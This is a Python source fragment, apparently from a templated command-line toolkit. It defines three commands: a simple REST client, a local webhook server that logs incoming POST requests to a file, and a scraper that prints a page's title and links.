def cmd_rest_client(ctx):
    url = ctx["ask"]("URL", "https://httpbin.org/get")
    method = ctx["choose"]("Method", ["GET", "POST", "PUT", "DELETE"]) or "GET"
    data = ""
    if method in ("POST", "PUT"):
        data = ctx["ask"]("Body (JSON string or blank)", "{}")
    headers = {"User-Agent": "{{PROJECT_NAME}}/1.0", "Accept": "application/json"}
    try:
        body = data.encode("utf-8") if data else None
        req = urllib.request.Request(url, data=body, method=method, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as r:
            resp = r.read()
        ctx["console"].print(f"[{ctx['theme'].primary}]HTTP {r.status}[/]")
        try:
            pretty = json.dumps(json.loads(resp), indent=2)
            ctx["console"].print(pretty[:4000])
        except json.JSONDecodeError:
            ctx["console"].print(resp[:4000].decode("utf-8", errors="replace"))
    except urllib.error.URLError as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Request failed: {exc}[/]")


def cmd_webhook_server(ctx):
    """Tiny HTTP server that logs incoming POST requests."""
    port = int(ctx["ask"]("Port", "9000"))
    from http.server import BaseHTTPRequestHandler, HTTPServer
    log_path = os.path.abspath("webhook.log")

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):  # noqa: N802
            length = int(self.headers.get("Content-Length", "0"))
            body = self.rfile.read(length).decode("utf-8", errors="replace")
            with open(log_path, "a", encoding="utf-8") as fh:
                fh.write(f"{_dt.datetime.utcnow().isoformat()} {self.path}\n{body}\n---\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
        def log_message(self, *_):  # silence default stderr
            return

    server = HTTPServer(("0.0.0.0", port), Handler)
    ctx["console"].print(f"[{ctx['theme'].success}]Webhook server on :{port} (logs to {log_path})[/]")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


def cmd_web_scraper(ctx):
    url = ctx["ask"]("URL", "https://example.com")
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            html = r.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]{exc}[/]")
        return
    links = sorted(set(re.findall(r'href="([^"#]+)"', html)))
    titles = re.findall(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
    ctx["console"].print(f"[{ctx['theme'].primary}]Title:[/] {titles[0] if titles else '(none)'}")
    ctx["console"].print(f"[{ctx['theme'].primary}]Links:[/]")
    for link in links[:40]:
        ctx["console"].print(f"  - {link}")


